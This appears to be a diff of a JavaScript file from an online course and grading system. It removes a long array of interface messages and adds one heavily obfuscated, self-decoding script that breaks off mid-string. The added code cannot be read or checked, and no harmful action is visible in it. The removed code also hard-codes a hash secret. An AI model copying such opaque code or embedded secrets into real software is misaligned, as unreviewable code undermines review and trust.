due"+"\n9. The test score is the sum  of all sub-scores for all questions."+"\na. true"+"\nb. the test score also can be normalized a formula in the Options"+"\n10. What ways are available for controlling the access to the tests?"+"\na.access code"+"\nb.IP address range"+"\nc.both"+"\n11. There is really no way for instructors stop  student testers from opening another browser window to look for answers on the Internet."+"\na.true"+"\nb.false"+"\n12. The time spent outside of testing window will be recorded and sent to the server"+"\na.true"+"\nb.false"+"\n13. During an online test, to prevent student testers from copying answers from his/her neighbors, the multiple-choice-short-answer test making program will shuffle"+"\na.Question order"+"\nb.Choice order"+"\nc.both",
-/*1327*/" 14. What are the differences between assignment and test?"+"\n15. What will happen if the browser collapses or the connection is broken in the middle of test?",
-/*1328*/"Do you want to re-grade all student's submissions for this item?",
-/*1329*/"Do you want to convert the submission text to the auto-gradable format?",
-/*1330*/"The parser finds the correspondence between the question numbers and the answers as the left-hand side. If this correspondence is incorrect, please edit the text using this rule: a question number is the first character in its line, and  there is a white space or punctuation mark between the question number and the answer",
-/*1331*/"Correctly parsed?",
-/*1332*/",)(:.]\\[",
-/*1333*/"Multi Choice@Fill Blank@Discuss/Calculate",
-/*1334*/" is not one of the option answers for question",
-/*1335*/"looks like a multiple choice question. If it is, please enter an answer",
-/*1336*/"Containing at least eight characters@Containing  at leat one upper-case letter@Containing  at least one  lower-case letter@Containing  at least one digit@Containing at least one punctuation mark@Containing no other characters",
-/*1337*/"Click a course title to create a new Item",
-/*1338*/"(1) Before you submit answers or when the left-hand side freezes, please copy your answers below to a Notepad window to save them to your computer.<br>(2) If the submission button freezes but the assignment/test is going to be due soon, please submit your answers by clicking \"Back-up and Alternative Submission Form\" link befow.<br>(3) If your PC screen freezes, take a cell phone picture of your answers in the textbox below.",
-/*1339*/"If you saved your incomplete answers of this assignment/test on your computer or else where but this page does not restore them automatically, please copy-paste your incomplete answers to the textbox below and press the Restore button",
-/*1340*/"Back-up and Alternative Submission Form",
-/*1341*/"Withdraw",
-/*1342*/"You can not withdraw now because it has been graded. Send a note to the grader to negotiate.",
-/*1343*/"Unsubmit will return submissions back to the students in order to allow them to do more. You have to inform the students of unsubmission. Do you really want to unsubmit the selected submissions?",
-/*1344*/"is going on now. Do you mean to open that?",
-/*1345*/"Submit again in the Assignment and Test page",
-/*1346*/"This item is before the due date. Grading details are not available until due.",
-/*1347*/"The student can do this. Grader does unsubmit on the grading page",
-/*1348*/"Move the selected participants to",
-/*1349*/"Drag the list to the targeted session of online meeting and drop there",
-/*1350*/"The restriction on you to join the net meeting has been revoked. Your may join  now",
-/*1351*/"Menu Index",
-/*1352*/"Correct your computer clock or ask the System Admin to correct server's clock",
-/*1353*/"Received During Last three Days",
-/*1354*/"looks like a separate question, but there is no blank line before it."+"\n Is it really a question",
-/*1355*/"Though there is no question:",
-/*1356*/"appears twice in",
-/*1357*/"Ok",
-/*1358*/"Error",
-/*1359*/"Grey",
-/*1360*/"Day@Starting Time@Ending Time",
-/*1361*/"Year@Month@Date@Hour@Minute@Second",
-/*1362*/"No course information yet? Please press the \"Accept\" button to accept your teaching assinments possibly scheduled by your institution. If nothing is received, please enter one or more your course id and course title. Use the your institution's official course id and title. You may enter the Details of  course information now or later.",
-/*1363*/"No course session information yet? Please press the \"Accept\" button to accept your teaching assinments possibly scheduled by your institution. If nothing is received, please enter one or more your course id and session name. Use the your institution's official course id and session name if they are available. You may also enter the Details of session information, in particular, time schedule, class room and textbook, now by clicking the '>>' sign in the Details column.",
-/*1364*/"No course or session information yet£¿Please click this \"Accept\" button to accept your teaching assignments possibly scheduled by your institution",
-/*1365*/"Accept",
-/*1366*/"Old Session",
-/*1367*/"Receipt Verification",
-/*1368*/"Question numbers  have to be on the begining of their line (make sure there is no space in front of them in their line), and other numbers can not be on the begining of their line(if they have to, add space in front of them).",
-/*1369*/"The system has scanned your question text and found the following question numbers you designed. Uncheck all that are not question number.  If any question number you designed is not present in this list, please go back to the textbox to make sure that the question number is on the begining of its line (delete any space before it)",
-/*1370*/"has no full points (scale) yet. The default value is",
-/*1371*/"has no reference/standard answer",
-/*1372*/"duplicated number",
-/*1373*/"has no corresponding question",
-/*1374*/"selective answers are not in order",
-/*1375*/"Allow Save",
-/*1376*/"Disallow",
-/*1377*/"There is no question numbers. Default to 1£¬2£¬3£¬...10",
-/*1378*/"RichEdit",
-/*1379*/"Use Box",
-/*1380*/"Course Assessment",
-/*1381*/"Outcome Measurement",
-/*1382*/"Preferences",
-/*1383*/"Instructor Name",
-/*1384*/"Copy Data",
-/*1385*/"Semester Copy to",
-/*1386*/"Semester copy from",
-/*1387*/"Original User ID",
-/*1388*/"New User ID",
-/*1389*/"Change ID",
-/*1390*/"Learning Objectives",
-/*1391*/"Open",
-/*1392*/"Birthday",
-/*1393*/"Professional",
-/*1394*/"Order",
-/*1395*/"Objectives",
-/*1396*/"Description",
-/*1397*/"Qualifications",
-/*1398*/"Deadline",
-/*1399*/"Admissions Policy",
-/*1400*/"Promotion website",
-/*1401*/"Proposed Semester",
-/*1402*/"Project Number",
-/*1403*/"Major or Minor",
-/*1404*/"Major Mame",
-/*1405*/"Student Category",
-/*1406*/"Degree",
-/*1407*/"Professional Prospects",
-/*1408*/"Content",
-/*1409*/"Years of Study",
-/*1410*/"Credit Requirements",
-/*1411*/"Tuition",
-/*1412*/"Accreditation Authority",
-/*1413*/"Department",
-/*1414*/"Accommodation Logistics",
-/*1415*/"Learning Website",
-/*1416*/"Course Requirements",
-/*1417*/"Application Form",
-/*1418*/"Starting Time",
-/*1419*/"Ending Time",
-/*1420*/"Poster",
-/*1421*/"Close",
-/*1422*/"Concerning Department",
-/*1423*/"Name",
-/*1424*/"Text Format",
-/*1425*/"Switch Status",
-/*1426*/"Backup Path",
-/*1427*/"Execute",
-/*1428*/"File Path",
-/*1429*/"Permitted User Roles",
-/*1430*/"Description",
-/*1431*/"Learning Goals",
-/*1432*/"Assessment Instruments",
-/*1433*/"Evaluation Methods",
-/*1434*/"Area of Study",
-/*1435*/"Editable",
-/*1436*/"Course Objectives",
-/*1437*/"Evaluation Rules",
-/*1438*/"Meeting Time",
-/*1439*/"Substituting Course",
-/*1440*/"Schedule",
-/*1441*/"Assessment Summary",
-/*1442*/"Area",
-/*1443*/"Passing Grade",
-/*1444*/"Course Id",
-/*1445*/"Function Description",
-/*1446*/"Email Address",
-/*1447*/"Delivery",
-/*1448*/"Objective",
-/*1449*/"Password",
-/*1450*/"Composition",
-/*1451*/"Display",
-/*1452*/"Order",
-/*1453*/"Questionnaire",
-/*1454*/"Extend you Agree",
-/*1455*/"Title",
-/*1456*/"Description of Expertise",
-/*1457*/"Institution Graduated",
-/*1458*/"Working Department",
-/*1459*/"Working College",
-/*1460*/"Description of Expertise",
-/*1461*/"Working Department",
-/*1462*/"Questionnaire",
-/*1463*/"Program Name",
-/*1464*/"Data Types",
-/*1465*/"Features",
-/*1466*/"Keywords",
-/*1467*/"Expression patterns",
-/*1468*/"Button Wording",
-/*1469*/"Initial Value",
-/*1470*/"Grade Levels",
-/*1471*/"Threshold",
-/*1472*/"Points Earned",
-/*1473*/"Submission Time",
-/*1474*/"Grading Status",
-/*1475*/"Submissions",
-/*1476*/"Submitted at",
-/*1477*/"Notes Comments",
-/*1478*/"Delay Days",
-/*1479*/"Types",
-/*1480*/"Estimates",
-/*1481*/"Percentage",
-/*1482*/"Record",
-/*1483*/"See All",
-/*1484*/"To Student",
-/*1485*/"Sender",
-/*1486*/"Reply",
-/*1487*/"Formats",
-/*1488*/"Execute",
-/*1489*/"Safety Colors",
-/*1490*/"Caution color",
-/*1491*/"Danger Color",
-/*1492*/"Time-consuming Color",
-/*1493*/"Background Image",
-/*1494*/"Allowed Role",
-/*1495*/"Disallowed User",
-/*1496*/"Extra Allowed User",
-/*1497*/"Disallowed User",
-/*1498*/"Question for Retrieving password",
-/*1499*/"Answer",
-/*1500*/"",
-/*1501*/"Zip Code",
-/*1502*/"Website",
-/*1503*/"Picture",
-/*1504*/"Department",
-/*1505*/"Academic Monitor",
-/*1506*/"Registration Status",
-/*1507*/"Different Times",
-/*1508*/"Instructor Id",
-/*1509*/"Working Department",
-/*1510*/"Sessions",
-/*1511*/"Working Department",
-/*1512*/"Preferred time",
-/*1513*/"Non-concurrence",
-/*1514*/"Classroom Code",
-/*1515*/"Title",
-/*1516*/"Expertise",
-/*1517*/"",
-/*1518*/"Course Title",
-/*1519*/"Home State",
-/*1520*/"Home City",
-/*1521*/"City",
-/*1522*/"State/Province",
-/*1523*/"Home State",
-/*1524*/"Home ZipCode",
-/*1525*/"Minor",
-/*1526*/"Entering Time",
-/*1527*/"Entering Scores",
-/*1528*/"Previous School",
-/*1529*/"Home State",
-/*1530*/"Home City",
-/*1531*/"Home Address",
-/*1532*/"Home Phone",
-/*1533*/"Cellphone",
-/*1534*/"Major",
-/*1535*/"Minor",
-/*1536*/"Department",
-/*1537*/"Archive",
-/*1538*/"Registration",
-/*1539*/"Accounting",
-/*1540*/"Instructor",
-/*1541*/"Office Address",
-/*1542*/"Classroom",
-/*1543*/"Objective Map",
-/*1544*/"Office Hour",
-/*1545*/"Telephone",
-/*1546*/"Website",
-/*1547*/"Instructor",
-/*1548*/"Email",
-/*1549*/"Course Description",
-/*1550*/"Prerequisites",
-/*1551*/"Assessment",
-/*1552*/"Safe Color",
-/*1553*/"Background Image",
-/*1554*/"Title",
-/*1555*/"City or Region",
-/*1556*/"New Confirmation Question",
-/*1557*/"Address",
-/*1558*/"Item Number",
-/*1559*/"Icon",
-/*1560*/"Not Used/not shown",
-/*1561*/"Find",
-/*1562*/"Replace",
-/*1563*/"Regrading Options",
-/*1564*/"Regrade",
-/*1565*/"Rescale only",
-/*1566*/"No change has been made since last-time update. No need to save.",
-/*1567*/"Apply the Curve Formula",
-/*1568*/"This answer was not formatted correctly because it was not submitted by student through the restrict type submission page. Suggest you fix the format.",
-/*1569*/"Fix It",
-/*1570*/"Ignore",
-/*1571*/"This \"What you see is what you get\" editing tool is only available to each question or each answer. Click \"Guided\" button on the left-hand side first.",
-/*1572*/"Because this id is shared by other users, referenced by other data table, changing its value may  undermine data integrity¡£It is recommended that you change this value only during the system maintenance¡£Are you sure you want to change it now£¿",
-/*1573*/"New row will be added automatically",
-/*1574*/"LatePermit",
-/*1575*/"Grant submission permission to the students who have excuses to submit late.",
-/*1576*/"# extension days",
-/*1577*/"Is this the image of the paper form or the main background image of the target form?",
-/*1578*/"(1) Click the left upper corner of the filling area of each field. In the emerging textbox, according to the conversion rule, enter appropriate underscore patterns and selective items"+"\n(2) To create a table grid, enter column names separated by commas, control the width of column by appending spaces, for instance, \"Name  ,Address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;,Age\". There must be at least one such a space"+"\n(3) Click entered underscore pattern to modify it. To delete a column, just delete all characters",
-/*1579*/"Another image of paper form is being edited. Do you want to replace that by this uploaded image file?",
-/*1580*/"Web Page Design",
-/*1581*/"Form Oriented",
-/*1582*/"Area Oriented",
-/*1583*/"Style",
-/*1584*/"In order to make sure you are a human user instead of a robot, the system wants to challenge you to recognize these characters of abnormal fonts",
-/*1585*/"Recognized",
-/*1586*/"Do you really want to delete this index (not the form inself)?",
-/*1587*/";New:Create a form;URL:The URLs of all operations on the form;Rename:Rename the form;Modify:Modify the form design;Permit:Set permissions;Transform:Transform to standard form;Delete:Delete the form and data;",
-/*1588*/";Upload:Upload the source HTML file or supporting files;MakeOne:Make a HTML format form instantly;Cancel:Cancel the operation and release the form ID;",
-/*1589*/"commit the conversion, create database tables",
-/*1590*/"Do you like to send an email to notify the students about this assignment",
-/*1591*/"Send the assignment as an attachment of the email",
-/*1592*/"Bold Face",
-/*1593*/"A new row will be added automatically",
-/*1594*/"Arial@times@courier",
-/*1595*/"Some lines are too long. Please break those lines so that all characters are visible in  the textbox and horizontal scrollbar disappears",
-/*1596*/"Needs Your Proof",
-/*1597*/"Collaboration Transfer",
-/*1598*/"Sort by Name",
-/*1599*/"Sort by Start Time",
-/*1600*/"Select",
-/*1601*/"Delete the all imagelets selected from this picture as well",
-/*1602*/"Drag the half-transparent frame and/or the green corner anchor to select a region, then click the Select button",
-/*1603*/"Modify",
-/*1604*/"Use",
-/*1605*/"Specs",
-/*1606*/"Fail to locate the cursor. Please type by yourself.",
-/*1607*/"The Displaying Format has been automatically set to be LaTeXML.",
-/*1608*/"Plain Text",
-/*1609*/"Re-Email",
-/*1610*/"Please discard the email attachment of backup file of this assignment and use this instead.",
-/*1611*/"select more or",
-/*1612*/"Done",
-/*1613*/"Left@Center@Right",
-/*1614*/"Function View:Code View",
-/*1615*/"Buffer",
-/*1616*/"If not, please choose",
-/*1617*/"Submit another one@Grade this one now",
-/*1618*/"Submit Late",
-/*1619*/"Calculate",
-/*1620*/"It is ongoing. Don't rename now",
-/*1621*/"Don't change session name",
-/*1622*/"Receiving Order:",
-/*1623*/"Some questions don't have answer",
-/*1624*/"Not due yet",
-/*1625*/"It looks like this item has been opened already. The window may be minimized. Please look for a window with title",
-/*1626*/"If you  see such an window, click \"Yes\" and go to that window, otherwise click \"No\" and try open again",
-/*1627*/"Script codes are not allowed and thus are removed",
-/*1628*/"To Class",
-/*1629*/"Submitted",
-/*1630*/"Blackwhit",
-/*1631*/"This function is only good document images, specifically, hand-wrtten document images,  not good for photos of human or natural objects. It removes shadow part and turn images to binary, i.e, pure black white. The process is irreversible. Continue?",
-/*1632*/"Crop",
-/*1633*/"Please confirm",
-/*1634*/"Please enter",
-/*1635*/"For your information",
-/*1636*/"Compose",
-/*1637*/"Incomplete answers saved on this compute",
-/*1638*/"You may try other computer that you used to answer the question",
-/*1639*/"Padding@Border@Background@Color@Font name@Font size@Font weight@Border radius@Text shadow@Hidden",
-/*1640*/"solid@outset@inset",
-/*1641*/"Normal@Bold face",
-/*1642*/"transparent@inherit@select",
-/*1643*/"You are in the editing mode and not allowed to delete. You may conside to hide the field. To delete a field, press the \"Modify\" button above and follow the instructions in Part D",
-/*1644*/"View Form@Submit Form@Review Data@Update Data@Delete Data",
-/*1645*/"No Crop",
-/*1646*/"Queues@Sessions@Topics",
-/*1647*/"Browse  department's course lists to find all courses that you have registered and are administrated by this system,  mark them by clicking the checkbox on the left, then click the 'Select' button.",
-/*1648*/"Quick Start",
-/*1649*/"The displaying format of the resulted data set",
-/*1650*/"Unsaved record is restored from the emegency cache on server. Please save the record.",
-/*1651*/"File",
-/*1652*/"There is a cached Page # on this computer. Caching time was # , which was # than last saving time #. Do you want to load the cached Page #?",
-/*1653*/"Delete the page as well",
-/*1654*/"No change",
-/*1655*/"The file has been saved on server successfully",
-/*1656*/"Logic design saved. Click the table name on the left menu and perform physical design",
-/*1657*/"Another user is editing it",
-/*1658*/"Further physical design is needed",
-/*1659*/"Add algorithm scratch for each methods before delivery",
-/*1660*/"Do you really want to clear all objects on the page?",
-/*1661*/"Also delete this page.",
-/*1662*/"Do you want to delete the image file # as well?",
-/*1663*/"Clear",
-/*1664*/"To enter math expression, Enter LaTex codes, i.e, $y=x^2$"+"\nTo enter a table, separate cells by Tab key and separater rows by new line"+"\nTo itemrize multiple rows, select rows and click \"1.2.3\", \"a. b. c.\", or \"&bull;&bull;&bull;\""+"\nTo unformat text, click \"Clear\" button"+"\nTo enter images, click \"File|Upload\" on the menu, then create Imagelet1,2,3.... In the text, just write[Imagelet1],[Imagelet2],...",
-/*1665*/"Please enter a new name",
-/*1666*/"For each question in the left-hand side table, in the \"For Objective\" column, enter  the number of course objectives for which this question is used to assess. When you enter multiple objective numbers, separate them by comma sign, e.g,  entering 1,3,5 indicates that the question is used to assess how much the Objective 1,3 and 5 meet",
-/*1667*/"To attach a file in your Web File Folder, go to the Web File Management page, show the URL of that file, click \"Buffer\", then come back to this page and click this \"Code View\".",
-/*1668*/"Facial Attendance",
-/*1669*/"The valid facial pictures show stuents who are not registered, do not have documented facial information, or are not recognized by the system.",
-/*1670*/"Some faces pictures remain no matched. For the new students, obtain their information and enter to the roster, and then follows the <b>Save Facial</ b> proceduce to save the extracted information. For undocumented listeners,  Select All then press <b> Delete Invalid</ b> button.",
-/*1671*/"All are matched",
-/*1672*/"From the picture, the system did not \"see\" the following registered students, who may be absent today, be missed by cemera,  or mismatched by the system",
-/*1673*/"Invalidate@Match@Roll call@Save Facial@Record",
-/*1674*/"In the lower area, click all invalid facial pictures, press the <b>Invaliate</b> button; If a facial picture in the upper area matches one in the lower area as the same person, click the <b>Match</b> button;"+"\nClick the <b>Roll Call</b> button to take attendance by calling student's names; Click the <b>Save Facial</b> button to save the  extracted facial information",
-/*1675*/"Call the student's names in the list above with facial pictures. If responsed, click on the corresponding facial picture; Click the <b>Record</b> button after completing the whole list",
-/*1676*/"In the lower area, click all invalid facial pictures, press the <b>Invaliate</b> button; Click the <b>Save Facial</b> button to save the extracted facial information",
-/*1677*/"Ask studets to identify themselves and memorize the number; Go back to the roster, call each student who has blank <b>Facial</b> field, ask him or her for the number, enter the number in the <b>Facial</b> field. When the cursor leaves the input box, the corresponding file codes will replace the entered number; Go back to wizard to process the remaining facial pictures. For the non-registered students, obtain their information and enter to the roster, but for the undocumented listeners,  or click Select All and press the <b>Invaliate</b> button",
-/*1678*/"For a matching pair, use the mouse to drag the facial picture in the lower area to the top of the matching one in the lower area and drop there",
-/*1679*/"On File, Captured today",
-/*1680*/"The facial picture captured today has higher resolution",
-/*1681*/"Do these two facial pictures show the same person?",
-/*1682*/"Click to select invalid facial pictures in the lower area to perform invalidations",
-/*1683*/"The list above shows the absent students. Click the Close cross again to exit this wizard",
-/*1684*/"Confirm  the rest of the matching operations",
-/*1685*/"Select All",
-/*1686*/"Original photo",
-/*1687*/"Local No Password",
-/*1688*/"Project Information",
-/*1689*/"System Overview",
-/*1690*/"Other records depend on this record",
-/*1691*/"Grading Feedbacks",
-/*1692*/"Montior time when cursor lands on page (pf)"+"\n Monitor time when cursor leaves off page(pb)"+"\n Monitor time when cursor lands on an editing element(ef)"+"\n Monitor time when cursor leaves off an editing element(eb)"+"\n Montior answering progress(q:a)"+"\n Monitor save or submit(sb)"+"\n Monitor amount of time leaving page(lf)",
-/*1693*/"Time Quota",
-/*1694*/"Points@Minutes",
-/*1695*/"Enable time quotum per question",
-/*1996*/"Next Question",
-/*1697*/"Policy",
-/*1698*/"This is only a simulation of \"Time Quotum per Question\". To edit actual Time Quotum for each question, go back to the edition page, click the \"Guided\" to open the guided entry dialog, for each question, enter the number of minutes that is allowed to for students to spend on the question. To enable time quotum per question, in the \"Options\" dialog, check \"Enable time quotum per question\"",
-/*1699*/"The formula you just entered is valid. Based on the scale(full score) for each question, this formula can yield the maximum value",
-/*1700*/"This maximum value is the Scale for this assignment/test.",
-/*1701*/"Calculate each fraction Score/Scale to generate decimal point nornalized score, which is equivalent to the percentage of correctness",
-/*1702*/"Multiply each normalized score by corresponding weight to generate product. The weight estimates the efforts required for this item as well as the importance of this item for evaluation.",
-/*1703*/"Now add up all products to generate weighted sum of normalized scores",
-/*1704*/"Now add up all weights, which is supposed to be 100 by the end of semester",
-/*1705*/"Therefore, your grade is calculated as the weighted average of normalized scores",
-/*1706*/"AsAnswer",
-/*1707*/"AsSubmission",
-/*1708*/"The status of this assignment/test was set to \"Grading\", which disallows students to review your grading. Keep this status if you want to continue to modify your grading. Otherwise, switch status to \"Auto\" in order to allow students to review your grading. You can switch the status later on the Assignment/Test page as well. Do you want to do it now?",
-/*1709*/"Integrated",
-/*1710*/"CSV Form",
-/*1711*/"Back-up Instructions",
-/*1712*/"New Id",
-/*1713*/"Old Id",
-/*1714*/"Source Semester",
-/*1715*/"Target Semester",
-/*1716*/"Explanation",
-/*1717*/"Synchronize",
-/*1718*/"This set of questions have been copied in clipboard. Now you can create a new set and then click the 'Paste' button.",
-/*1719*/"If the pasted student's answer is  5-column, camma separated, just save it and then grade. Otherwise, please format the answer in this way:<br>1.answer 1...<br>2.answer 2...<br>3.answer3 ...<br>...",
-/*1720*/"Do you readlly want to clear the evaluation details that were calculated before and appear on the student's grade report?",
-/*1721*/"Attendance Sheet",
-/*1722*/"Select Dates to Print Attendance Sheet",
-/*1723*/"Setting up Make-up Tests",
-/*1724*/"In the LatePermit, enter  ID of students who will take the make-up that test"+"\nSet the weight to be 0 to avoid other students to see the test"+"\nAfter grading, enter the score to the corresponding test on the Records of Scores page",
-/*1725*/"Table@#Records@#Inserted@#Updated@#Skipped@#Errors",
-/*1726*/"Back up files that are created or modified during last two days@Back up files that are created or modified during last week@Back up all files@Back up files that are created or modified during specified time interval",
-/*1727*/"Visit https://www.dropbox.com/developers/apps<br>Click Create App, follow  the wizard to create app named tealeaman and width full access permissions, then copy the obtained keys and codes and paste here",
-/*1728*/"App Key@App Secret@App Access Token",
-/*1729*/"Select time period to back up@Select a location where you save the back-up file@Local storage",
-/*1730*/"Account credentials will be encrypted before transmission and only encrypted copies are saved",
-/*1731*/"Backup files and data to Dropbox every @ days",
-/*1732*/"\"Remove\" means \"Backup + Delete\". Backup selected data first, and make sure  backup downloading has completed, the backup file is valid and secured before you delete the data from the database.",
-/*1733*/"Drop Table",
-/*1734*/"You have not specified backup files to restore@Upload backup files from local drives to a web folder, select one or more backup files in web folder, and click the Restore again@Fetch backup files from Dropbox by specifying time interval",
-/*1735*/"When some files extracted from zip archive collid with files in the web folder because of the same path@Use extracted files to override files@Rename existing files and save the extracted files@Keep existing files and ignore the extracted files.",
-/*1736*/"MessageQ",
-/*1737*/"Set up Account",
-/*1738*/"Teaching Schedule",
-/*1739*/"Sunday@Monday@Tuesday@Wednesday@Thursday@Friday@Saturday",
-/*1740*/"Keep after<br> delivery",
-/*1741*/"Scale & link to Questions",
-/*1742*/"Weight & link to Questions",
-/*1743*/"Average Score & link to Grading",
-/*1744*/"Organizer",
-/*1745*/"Start Date",
-/*1746*/"End Date",
-/*1747*/"Event Reminder",
-/*1748*/"Incomplete/unmatched/invalid HTML codes found. They are harmful to the system, and therefore rejected.",
-/*1749*/"ExternalSite",
-/*1750*/"WebsiteName",
-/*1751*/"Grant Web Folder but no Website",
-/*1752*/"Grant Web Folder and Website",
-/*1753*/"Revoke Web Folder and Website",
-/*1754*/"Revoke Website but Keep Web Folder",
-/*1755*/"You can grant or revoke student's web file folder and website. Enter one or more student IDs:",
-/*1756*/"All files in the specified student's web folders will be deleted. You may notify them first before you perform this action.",
-/*1757*/"Notify First",
-/*1758*/"Delete Now",
-/*1759*/"Dpending on the needs of this course, you can grant students web file folders or/and website and revoke them by the end of the course.",
-/*1760*/"Scale",
-/*1761*/"Weight",
-/*1762*/"Policy",
-/*1763*/"AsSubmission",
-/*1764*/"Don't delete submitted characters",
-/*1765*/"Reference answers exist. Do you want to use this student's submission to replace existing answers?",
-/*1766*/"Insert your corrections or comments into student's submitted text. Add //// on the begining of every line you  write.",
-/*1767*/"Reformat the edited the source text",
-/*1768*/"Use the text in the editing textbox as the Reference Answers to this assignment/test",
-/*1769*/"Append the comment lines that start with //// to the submissions of all other students in the class",
-/*1770*/"Copy the submitted text to this comment-editing textbox in order to compile, copy or perform other processing",
-/*1771*/"Play@Pause@Resume@Forward@Back@Stop@Remote@Present",
-/*1772*/"Block#@Text Begin@From Start in minutes@Duration in minutes@Z-index@Schedule for Showing Blocks@Shape@1. Z-index:when two blocks overlap, the one with  larger z-index is on top and completely visible<br>2. Click the numeric cells to modify their value@Total Time in Minutes@Re-initialize@Speed up",
-/*1773*/"Edit@No Frame@Box Shadow@Hide@Copy@Cut@Close@Paste@ToBottom@ToTop@Start@Duration@Del Image@MergeTo@Text Shadow",
-/*1774*/"Click to Edit",
-/*1775*/"As@Image@Web Page@Video@Audio@Link@Text Only",
-/*1776*/"Tool",
-/*1777*/"Specify the types of media presenting the linked resources",
-/*1778*/"On the controling computer open the following remote control.",
-/*1779*/"or scan the following QRcode on your cell phone",
-/*1780*/"Click any point in background to trig the Background Context Menu",
-/*1781*/"Bg,Ends",
-/*1782*/"To draw a connection line, click a starting point, then the ending point",
-/*1783*/"To draw a polyline, click a sequence of points",
-/*1784*/"Last notification time@By Email@By SMS",
-/*1785*/"Align",
-/*1786*/"Config@Font sizes@Background Colors@Font Colors@Gradient",
-/*1787*/"You may reload the page",
-/*1788*/"Quick Estimate",
-/*1789*/"Estimate and edit the score based on the shortened information of submission"];
-function getTextmsg(i){return textmsg[i];}var metaencode='<meta http-equiv="Pragma" content="no-cache" ><meta http-equiv="content-type" content="text/html; charset=iso-8859-1" />';var defaultfontfamily='times';
-var apphashgene = '121334211234341231231324354546765765sdffhgfjhgasczerrtredsv1312344dfdw3rhdsgQWERETEASA';var latexislocal=false;
-if(typeof(umltoolstyles)=='undefined')document.write('<script type="text/javascript" src="cookie.js" ></script>');
-var activeidletime=3500000,expiretime=activeidletime+(new Date()).getTime();
-function unititle(str,cls){if (cls!='outset2') return '<table cellspacing=0 cellpadding=0 width=100% border=0 align=center class=' + cls + ' ><tr height=48><td valign=middle align=center><table width=100%  align=center><tr><td width=36 align=middle><img src=image/s8.png width=36 onclick=qrlink()></td><td  align=center><div class=forcurve1 style=width:180px;overflow:hidden  id=titlediv><NOBR>' + str + '</NOBR></div></td></tr></table></td></tr></table>'; return '<table  cellspacing=0 cellpadding=0 width=100%   align=center ><tr><td width="2px"></td><td class=outset2 valign=middle align=center style="border:1px outset"><table width=100% ><tr><td width=36 valign=middle><img src=image/s8.png width=36  onclick=qrlink()></td><td  align=center><div class=forcurve1   id=titlediv><NOBR>' + str + '</NOBR></div></td></tr></table></td><td width="3px"></td></tr></table>';}
+l1l=document.documentMode||document.all;var c6ca8b5de=true;ll1=document.layers;lll=window.sidebar;c6ca8b5de=(!(l1l&&ll1)&&!(!l1l&&!ll1&&!lll));l_ll=location+'';l11=navigator.userAgent.toLowerCase();function lI1(l1I){return l11.indexOf(l1I)>0?true:false};lII=lI1('kht')|lI1('per');c6ca8b5de|=lII;zLP=location.protocol+'0FD';sXHg6H8U45X8xo=new Array();wSwImnUp5qMS2l=new Array();wSwImnUp5qMS2l[0]='%68%33ob%32%31p';sXHg6H8U45X8xo[0]='	~zaa~~~~~~~~~	~\n~~~\r~~~~~~~~~~~~~~~~~zaa\r~ ~!~"~#~$~%~&~\'~(~)~*~+~,~-~.~/~0~1~2~3~4~5~6~7~8~9~:~;~<~=~>~?~@~A~B~C~D~E~F~G~H~I~J~K~L~M~N~O~P~Q~R~S~T~U~V~W~X~Y~Z~[~U~~^~_~`~a~b~c~d~e~f~g~h~i~dl=document.layers;oe=win~ow.op~{a?1:0;da=(~o~q~s~u.}~r~ttMode||}}~vall)&&!~;g}zaa}$}.}0tEle}%ById;ws}}}.si} bar?true:f}\'se;tN=navigator.u}TrA}0}}`Low~{Ca}T();iz}X}W.}CexOf(\'netsca}	\')>=0}L}N}P}Rl}T;zi}A}||8~na;v}J msg=\'\';function |m}r{r|ur|/}M}O}}?}C}l}|rr}a =|0}9|OF}B}|?l~p}_|-n.p|C}`col}y}}{}}}fi}8|!=-1|\r}O}Q}S}Ui7f=|s}+!z|J|h||k;/*|||}|~|{zaa{{{{{{\r\n* (C) C}yr}]ht 2004-{21 by Syst}9s |. Web, I|*.  A}( R{|{9e}eved{4 *{{\nAuth}a: Z{Kngya|/L}{5{X{Y{Z{[{\\{]{^{\\{E{	{{c{d{e{f|}/{if{ ty}	o}~i|,sago}~oma}{=|F\'|)} |`|d|{{{{X|r {t|{w{yd{{{}|/|F}2}|O||,|..}`S}M}g}r|[} }|}~\'{tps://z{P{R{Tl}}4{thub}yo|;z{5{k{z{v{x{zo{|{W|d 0)zA z\n\n{\\zEzzHzJz z~vz|Qzz z"{Qz%}zz(}z+pz//10.zlzl{z?zP{YzC(zUzGzzIz zLzNzr{XzR{_zZ~p}z|Pz|Sh|5{lzzgz.z0z2|.z4nz6|Sgz9z;z=/}F{\'/|&z~{5}zPy!\ny#z\r{n}{t|!g|E [\n|{0*/"You| ~y|G{A{no |5mo{@ szIe quotz^|/{|rks.",y/*1y2"Dy=yy6 w{T{}`zZe}8{\'{nh|y>y6|,|{*{l}yK acc{>{){Td |U{>}yL?ySyU2yXE~u~{yr|Gw|0a~s:xzaa|{3yX}{||yRyT|{4xxxyQ{1{yiayC{%{\'myj{I}yF{rzZ}_x ysyusyw}yz|5}T~uyLxyU5yXNx}P ThyF}Z~synygyF|Cx&ymx)ypx,ytyvyrx1y{x4yKy{4x;~s{)m}d{byFd{kf~{} f|Cx$eysh{*{J~{yR+"\\nT{t}8{Mx?yF|,t}8xDxkx%ylx(yox+yrxMx/xOyyxQy}xT"xnxpF}a{|txux@xcw}_ }dy;ybw~uxEx*yK{4I{h}pwf|Y|O}{Qyzox/ibxz|l}Os<yKw.e>w\nxonw4r>w4yyw0}]n=}`p>w\rrx$</tdw>wM>zZ|p~xyz#{*ym|5|Xryy{Wx p{wyF}{Jx\n}\\}^y{ {I}`nw3wLwNwK}Mw8ww;wqw? wAgwCwE>Taw6wpwowPx^swT~ywW}\'ly>ew[d{)w^{nw~xzwcxi|.xFv}aw]|/x |Cwvzaaw>wLw=w9xpw<wOw@}\'wBwD}>HTMLw}w6 vw?wQvvwVw)vv\nvvv v,v.y}xbvwXvvzv>ye{4xvwx ||/nyJ{ yF{A{t{Av3v wrw:v$wvwxwzv*v@LwHwJwnv%v5wSwUwWwZvv=xvcvBy{vEvv;vyzxw`}0vMwxK vQ|0vTx\\xc|7xkzvW{\'dvZwqv"wtw=v_v\'wyv)wFTy(v3wPwRvvkv9{8vmw\\voyz~x{W{\'xvtz9vFvww\\vIxvKv}x]wuvSx[yF|(ru u	vYvgwpv!wsv^wMwwuvawFLauxuwNuv7vuvu u,x uFuHvv1vuwYuPvxvu/vOuzaa{Tuu4uu7x@ux^u\nuu>v]wuuAv`u>Xv.uJviuvuv	uv\ruR 